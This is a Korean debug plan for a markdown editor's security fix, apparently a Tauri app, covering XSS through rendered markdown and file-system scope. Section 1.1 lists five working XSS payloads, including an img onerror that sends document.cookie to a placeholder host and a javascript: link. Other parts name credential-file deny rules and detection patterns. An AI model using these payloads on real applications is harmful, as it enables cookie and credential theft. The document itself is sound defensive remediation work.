# DEBUG_PLAN.md — B2 보안 배치 (BUG-20260826-01)

> **대상**: `project/` (Devoras `v0.8.26`)
> **출처**: [`code_review.md`](../code_review.md) §P0-1 — *v0.8.5 기준 **유일하게 앱 경계를 넘는 결함***
> **티켓**: [`20260826_1740_markdown_html_injection_and_fs_scope.yml`](../ticket/debug/20260826_1740_markdown_html_injection_and_fs_scope.yml)
> **직전 배치**: B1 데이터 보호 — 종결, [`claude-history/debug/DEBUG_PLAN_20260829_063211.md`](../claude-history/debug/DEBUG_PLAN_20260829_063211.md)
> **구조 분석**: [`ARCHITECTURE_FINDINGS.md`](../ARCHITECTURE_FINDINGS.md)
> **성격**: 신규 조사가 아니라 **이미 설계된 4개 레이어(L1~L4)의 미실행분 실행.**

---

## 0. 한 줄 요약

신뢰할 수 없는 마크다운 파일 하나를 Read 모드로 여는 것만으로 **임의 JS 실행 → `asset://` 로
홈 디렉터리의 dot 파일(`~/.ssh/id_rsa`, `~/.aws/credentials`)까지 읽어 외부로 전송**이 가능하다.
설계는 이미 있다(§6 L1~L4). **한 겹도 적용되지 않았다.**

---

## 1. 현재 상태 실측 (2026-08-29 확인)

`code_review.md` 작성 시점 이후 변화가 있어 **직접 재확인**했다. 리뷰의 기술 중 일부는 낡았다.

| 레이어 | 리뷰(2026-08-26)의 기술 | **2026-08-29 실측** |
|---|---|---|
| **L1** 새니타이즈 | "`escapeHtml` 헬퍼 추가 필요" | ⚠️ **부분 진전** — `escapeHtml` 은 **이미 존재**하고(`ReadView.tsx:19`, `&` 우선 치환 순서도 올바름) img·figcaption·코드펜스 title 에 적용돼 있다. **남은 것은 DOMPurify 부재와 `safeText` 한 곳.** |
| **L2** CSP | `"csp": null` | ❌ 그대로. `devCsp` 도 없음 |
| **L3** Rust 경로 검증 | `save_image_file` 무검증 | ❌ 그대로. 주석에 scope 우회가 **의도적으로 명시**돼 있다 |
| **L4** 권한 최소화 | 재귀 8건 + `shell:allow-open`, `deny: []` | ❌ 그대로. **+ B1 에서 이관된 미사용 `dialog:allow-message`** |

### 1.1 L1 실측 — 공격 벡터 5종이 전부 살아서 통과한다

`ReadView.tsx` 와 **동일 설정**(`new Marked({ gfm: true, breaks: true })`)으로 직접 측정:

```
🔴 LIVE   raw script tag      <script>alert(1)</script>
🔴 LIVE   img onerror         <img src=x onerror="fetch('http://127.0.0.1:9/'+document.cookie)">
🔴 LIVE   svg onload          <p><svg onload=alert(1)></svg></p>
🔴 LIVE   mark injection      <p><mark><img src=x onerror=alert(1)></mark></p>
🔴 LIVE   md link javascript:  <p><a href="javascript:alert(1)">click</a></p>
```

전부 그대로 `dangerouslySetInnerHTML`(`ReadView.tsx:460`)에 들어간다.

> **리뷰가 놓친 벡터**: `[click](javascript:alert(1))` — **마크다운 표준 링크 문법만으로** 성립한다.
> raw HTML 을 한 글자도 쓰지 않으므로 "raw HTML 만 막으면 된다"는 접근으로는 남는다.
> DOMPurify 는 기본 프로필에서 이걸 제거한다.

### 1.2 L1 잔여 지점 두 곳

1. **DOMPurify 부재** — `renderBlockToHtml`(`ReadView.tsx:124`)이 `resolveAssetPaths(html)` 를
   그대로 반환한다. 이것이 본체다.
2. **`safeText` 불일치**(`ReadView.tsx:62`) — `data-code` 속성에 넣는 값만 유독
   `escapeHtml` 이 아니라 **자체 치환**을 쓰는데 `&` 를 다루지 않는다.
   ```ts
   const safeText = codeText.replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   ```
   `&` 미처리 자체가 즉시 XSS 는 아니지만(따옴표가 막혀 속성 이탈 불가) **이스케이프 경로가
   두 벌 존재한다는 것**이 결함이다. 한쪽만 고쳐지는 사고가 반복된다. `escapeHtml` 로 통일.

---

## 2. 검증 티어 배정

§ 이전 배치에서 확립한 티어 모델을 그대로 따른다. **추가된 규칙 한 줄**:
> 티어를 올리기 전에 **"측정할 중간 지표가 있는가"** 를 먼저 묻는다.

| 게이트 | 질문 | 티어 | 근거 |
|---|---|---|---|
| **S1** 새니타이저가 벡터를 제거하는가 | 순수 문자열 변환 | **T1** | 레이아웃·스크롤 무관. §1.1 처럼 노드에서 직접 잰다 |
| **S2** CSP 가 인라인 실행을 차단하는가 | 브라우저 정책 | **T3** | CSP 는 `tauri.conf.json` 이 **컴파일 타임에 바이너리로 인라인**되므로 Rust 재빌드 필수. T2 는 CSP 를 전혀 반영하지 않는다 |
| **S3** Rust 가 워크스페이스 밖 쓰기를 거부하는가 | Rust 커맨드 | **T3** | Rust 코드 경로. `cargo test` 로 `ensure_inside` 단위 검증은 가능(**T1-rs**) |
| **S4** asset scope 가 dot 파일을 막는가 | Tauri 프로토콜 | **T3** | `asset://` 요청은 실기에서만 성립 |
| **S5** 회귀: 기존 이미지·코드블록 정상 | 렌더 | **T3** | `.devoras/images` 는 Tauri 자산 프로토콜 필요 — 기존 `tauri_t3_harness` R7 이 이미 검사한다 |

**중간 지표**(최종 증상 대신 이걸 잰다):

| 최종 증상 | 중간 지표 |
|---|---|
| "XSS 가 실행되지 않는다" | `sanitize(html)` 결과 문자열에 `on\w+=` / `<script` / `javascript:` **0건** |
| "dot 파일이 안 읽힌다" | `asset://` 요청의 **HTTP 상태 코드가 403** |
| "CSP 가 동작한다" | 콘솔의 **CSP 위반 로그 존재** + 네트워크 요청 0건 |

---

## 3. 작업 분해

### L1 — 새니타이즈 (T1 검증 가능, **선행 권장**)

```bash
pnpm add dompurify && pnpm add -D @types/dompurify
```
1. `renderBlockToHtml` 반환을 `DOMPurify.sanitize(...)` 로 감싼다.
   `USE_PROFILES: { html: true, mathMl: true, svg: true }` (KaTeX 의존성 존재),
   `ADD_ATTR: ['data-src', 'data-code']`.
2. `safeText`(`:62`) 를 `escapeHtml` 로 교체 — 이스케이프 경로 일원화.
3. **하네스**: `project/src/widgets/BlockEditor/__tests__/sanitizer_harness.ts` (T1)
   §1.1 의 5벡터 + `data-code` 속성 이탈 + KaTeX/`<mark>` 정상 통과(과잉 제거 방지).

> ⚠️ **성능 연계**(`code_review.md` §P2): `renderBlockToHtml` 은 이미 재파싱 비용이 지적된 지점이다.
> DOMPurify 가 그 비용을 배가시키므로 **캐시(`hash(content + workspacePath)`)를 같은 커밋에서** 넣을 것.

### L2 — CSP (T3)

`tauri.conf.json` 에 `csp` / `devCsp` **동시 지정**. `devCsp` 누락 시 Vite HMR 이 붕괴한다.
값은 `code_review.md` §P0-1 의 것을 그대로 쓴다.

### L3 — Rust 경로 검증 (T1-rs + T3)

1. `WorkspaceRoot(Mutex<Option<PathBuf>>)` 상태 도입.
   **워크스페이스 루트를 JS 인자가 아니라 Rust 상태에서 읽는다** — XSS 는 `invoke` 인자를 위조할 수 있다.
2. `ensure_inside(root, path)` — `canonicalize` 후 `starts_with` (심볼릭 링크 우회 차단).
3. `save_image_file` → `devoras_image_save` 개명(Stage 1 `devoras_{domain}_{action}` 컨벤션),
   진입부에서 `ensure_inside` 통과 후에만 `std::fs` 접근.
4. `#[cfg(test)]` 로 `ensure_inside` 단위 테스트 — `../` 탈출, 심볼릭 링크, 존재하지 않는 경로.

### L4 — 권한 최소화 (T3)

| 항목 | 조치 | 비고 |
|---|---|---|
| `assetProtocol.scope.deny` | `$HOME/.ssh/**`, `$HOME/.aws/**`, `$HOME/.gnupg/**`, `$HOME/.config/**`, `$HOME/.env*` 추가 | **설정 1줄. 즉시 적용 가치가 가장 높다** |
| `dialog:allow-message` | 제거 | 사용처 없음 (B1 에서 이관) |
| `fs:allow-{desktop,document,download}-*-recursive` | 실사용 확인 후 제거 | 워크스페이스는 사용자가 dialog 로 고르므로 재귀 권한 불필요할 가능성 |
| `shell:allow-open` | 사용처 확인 후 판단 | 외부 링크 열기에 쓰인다면 유지 |
| `allow: ["**"]` 제거 | 런타임 동적 허용 PoC 선행 | ↓ |

> **PoC 1시간 선행**: `fs_scope().allow_directory()` / `asset_protocol_scope().allow_directory()` 로
> 워크스페이스 선택 시 동적 허용이 되는지 확인한다. 되면 `"**"` 자체를 제거하고,
> 안 되면 `deny` 목록 + L3 에 의존한다(**강도 하락을 문서에 명시**).

---

## 4. 실행 순서 & 게이트

```
L1 (T1 통과) ──┐
               ├──> 단일 재빌드로 L2+L3+L4 동시 검증 (T3)
L4-deny (1줄) ─┘
```

| 순서 | 작업 | 게이트 | 커밋 |
|---|---|---|---|
| 1 | **L1** DOMPurify + `safeText` 통일 + 렌더 캐시 | S1 (T1) | `fix(x.x.x): 마크다운 새니타이즈 (BUG-20260826-01 L1)` |
| 2 | **L4-deny** 민감 경로 차단 + 미사용 권한 제거 | S4 (T3) | `fix(x.x.x): asset scope 민감 경로 차단 (L4)` |
| 3 | **L3** Rust 경로 검증 | S3 (T1-rs → T3) | `fix(x.x.x): save_image_file 경로 검증 (L3)` |
| 4 | **L2** CSP | S2 (T3) | `fix(x.x.x): CSP 도입 (L2)` |
| 5 | **L4-scope** `"**"` 제거 (PoC 결과에 따름) | S4 재실행 | 별도 |

**커밋을 합치지 말 것.** L2(CSP)는 가장 회귀 위험이 크다 — 깨지면 어느 레이어가 원인인지
분리할 수 있어야 한다. `.agents/AGENTS.md` 에 따라 커밋 전 패치 버전업(4개 파일 동시).

---

## 5. DoD

- [ ] **S1** §1.1 의 5벡터가 새니타이즈 후 전부 무력화 (`on\w+=` / `<script` / `javascript:` 0건)
- [ ] **S1-역방향** KaTeX 수식·`<mark>`·코드블록 헤더가 **과잉 제거되지 않음** (기능 회귀 0)
- [ ] **S2** 페이로드 `.md` 를 Read 모드로 열어 **네트워크 요청 0건 + 콘솔 CSP 차단 로그 확인**
- [ ] **S3** 워크스페이스 밖 절대 경로로 이미지 저장 호출 시 `Err` 반환
- [ ] **S4** `asset://localhost/Users/<user>/.ssh/id_rsa` 직접 요청 → **403**
- [ ] **S5** `pnpm tauri dev` HMR 정상 / `pnpm tauri build` 후 `.devoras/images` 이미지·코드블록 복사 버튼 정상
      (= `tauri_t3_harness` 의 R7 PASS)

---

## 6. 위험 및 주의

1. **`requireLiteralLeadingDot: false` 를 되돌리지 말 것.** `.devoras/images` 렌더링의 전제 조건이다
   (세션 티켓 constraints). dot 파일 차단은 `deny` 목록으로 한다.
2. **`tauri.conf.json` 은 컴파일 타임에 바이너리로 인라인된다.** 설정만 바꾸고 dev 로 확인하면
   반영되지 않은 것을 통과로 오인한다. **반드시 재빌드 후 검증.**
3. **`devCsp` 누락 시 Vite HMR 붕괴.** CSP 도입 커밋에서 가장 흔한 사고다.
4. **DOMPurify 과잉 제거 주의.** KaTeX 는 MathML/SVG 를 쓴다. 프로필을 좁히면 수식이 사라진다.
   S1-역방향 게이트를 생략하지 말 것.
5. **L3 의 루트를 JS 인자로 받지 말 것.** XSS 는 `invoke` 인자를 위조할 수 있다. Rust 상태에서 읽는다.

---

## 7. 병행 과제 (B2 와 독립, 착수 가능)

| ID | 내용 | 우선도 |
|---|---|---|
| ARCHITECTURE_FINDINGS **A7** | 헤딩 정체성이 내용 파생 → `key` 를 통한 EditorView 파괴(undo 손실) | **높음** — 유일한 데이터 손실 경로 |
| ARCHITECTURE_FINDINGS **A6** | 블록당 EditorView 비용 초과(N=200 에서 예산 20~58배) — 가상화 전 레이아웃 스래싱 프로파일 선행 | 중 |
| BUG-20260828-05 | R1 한글 IME — 실행/포커스 전환 직후 첫 조합 실패 | 중 |
| BUG-20260828-06 | 위젯 `toDOM` 예외가 블록 트리 붕괴 | 중 |
| BUG-20260828-04 | `---` 라인 ArrowUp 스킵 | 낮음 |
| `code_review.md` **P0-3** | 분할 패널 표시 계층(Stage A-2) 잔여 | 중 |
